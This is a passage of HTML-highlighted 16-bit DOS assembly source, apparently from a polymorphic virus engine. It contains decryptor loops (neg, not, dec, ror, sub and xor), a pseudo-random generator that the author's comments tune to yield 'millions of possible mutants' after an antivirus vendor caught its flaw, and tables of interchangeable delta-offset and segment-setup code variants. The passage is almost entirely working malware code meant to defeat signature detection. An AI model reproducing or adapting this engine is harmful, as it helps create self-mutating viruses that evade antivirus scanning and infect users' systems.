</span><span class="sc5">neg_crypte</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">neg_crypte</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">evite_autres_loops</span><span class="sc0">

</span><span class="sc5">not_crypte</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">not_crypte</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">evite_autres_loops</span><span class="sc0">

</span><span class="sc5">dec_crypte</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">dec_crypte</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">evite_autres_loops</span><span class="sc0">

</span><span class="sc5">ror_crypte</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">ror_crypte</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">evite_autres_loops</span><span class="sc0">

</span><span class="sc5">sub_crypte</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">sub_crypte</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">evite_autres_loops</span><span class="sc0">

</span><span class="sc5">xor_crypte</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">xor_crypte</span><span class="sc0">

</span><span class="sc5">evite_autres_loops</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------pseudo-random number generator--------------</span><span class="sc0">
</span><span class="sc1">;in: ax = upper limit</span><span class="sc0">
</span><span class="sc1">;out: ax = random number between 0 et limit-1 included</span><span class="sc0">

</span><span class="sc5">aleatoire</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">         </span><span class="sc1">;i've made a little error in this routine,</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">         </span><span class="sc1">;because i wanted to make slow poly with:</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Ah</span><span class="sc0">     </span><span class="sc1">;get date: return dh=month dl=day</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;i didn't thought that will restrict the  </span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">  </span><span class="sc1">;number of possible mutants to 365 (thanks</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">      </span><span class="sc1">;to AVP to have shown me this error). Replace</span><span class="sc0">
</span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">;the "get date" (mov ah, 2Ah) by a "get time"</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">;(mov ah, 2Ch) and you will have millions</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">;of possible mutants.</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;------------change an entire block of instructions--------------</span><span class="sc0">
</span><span class="sc1">;in: si=stock zone, di=offset in decryptor</span><span class="sc0">
</span><span class="sc1">;ax=number of possibilities, bx=number of bytes</span><span class="sc0">

</span><span class="sc5">mute_bloc</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">aleatoire</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;-------------possible mutations------------------------</span><span class="sc0">

</span><span class="sc1">;0/ get delta offset in 23 bytes</span><span class="sc0">

</span><span class="sc5">_mutation0</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc1">;delta:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">36h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">34h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">;sub ss:[di], offset delta</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mutation1</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EEh</span><span class="sc0">                           </span><span class="sc1">;jmp delta</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc1">;delta:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">36h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">34h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">;sub ss:[si], offset delta</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mutation1</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EEh</span><span class="sc0">                           </span><span class="sc1">;jmp delta</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc1">;delta:</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">36h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">34h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">;sub ss:[si], offset delta</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mutation1</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc1">;delta:</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">36h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">;sub ss:[di], offset delta</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mutation1</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc1">;delta:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">83h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">46h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">             </span><span class="sc1">;add word ptr [bp], mutation1-delta</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">37h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">;sub ax, offset delta</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc1">;delta:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">36h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">83h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc0">            </span><span class="sc1">;add word ptr ss:[bx], mutation1-delta+1</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">;sub ax, offset delta</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc1">;delta:</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">36h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">37h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">;sub ss:[bx], offset delta</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">36h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">46h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">;add word ptr ss:[bx], offset mutation1</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc0">
</span><span class="sc1">;delta:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">                    </span><span class="sc1">;loop mutation1</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">;sub ax, offset delta</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc1">;delta:</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">36h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">37h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">;sub ss:[bx], offset delta</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">36h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">46h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">;add word ptr ss:[bx], offset mutation1</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc1">;delta:</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">36h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">34h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">  </span><span class="sc1">;sub ss:[bx-2], offset delta</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mutation1</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">3h</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc1">;delta:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">05</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">;add ax, mutation1-delta</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">36h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">;sub ss:[bx], offset delta</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                 </span><span class="sc1">;mov ax, offset delta</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">;mov cx, offset mutation1-delta</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc1">;delta:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc6">clc</span><span class="sc0">


</span><span class="sc1">;1/ push es, ds then put es=ds=cs in 20 bytes</span><span class="sc0">

</span><span class="sc5">_mutation1</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc6">clc</span><span class="sc0">
